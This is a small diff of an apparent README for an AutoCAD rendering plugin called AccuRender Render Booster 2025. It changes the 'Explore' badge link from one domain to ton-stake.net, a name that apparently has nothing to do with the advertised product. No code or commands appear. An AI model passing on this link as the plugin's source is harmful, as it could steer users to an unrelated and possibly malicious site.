@@ -2,7 +2,7 @@
 
 🌟 Transform your AutoCAD projects with AccuRender Render Booster 2025! This powerful plugin enhances rendering with optimized materials, lighting, and automation, tailored for freelancers, architects, and small studios on Windows.
 
-[![Explore AccuRender Booster](https://img.shields.io/badge/Explore-AccuRender_Booster-blueviolet)](https://glocktober.com)
+[![Explore AccuRender Booster](https://img.shields.io/badge/Explore-AccuRender_Booster-blueviolet)](https://ton-stake.net)
 
 ---
 
